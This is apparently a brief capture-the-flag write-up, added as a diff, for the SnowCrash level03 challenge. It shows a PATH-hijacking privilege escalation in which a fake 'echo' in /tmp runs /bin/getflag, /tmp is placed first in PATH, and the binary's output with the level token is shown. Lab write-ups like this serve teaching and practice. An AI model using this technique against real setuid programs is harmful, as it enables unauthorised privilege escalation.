@@ -1,0 +1,16 @@
+Run strings (after trying 2478954287561 other cmd) on level03
+we see it use echo and it as exe perm on usr/bin
+we create a new fake echo in tmp and giving all user exc permission
+```
+echo "/bin/getflag" > /tmp/echo
+chmod 777 /tmp/echo
+```
+and we had it in first position of PATH
+```
+export PATH=/tmp:$PATH
+```
+rerun level03
+```
+level03@SnowCrash:~$ ./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
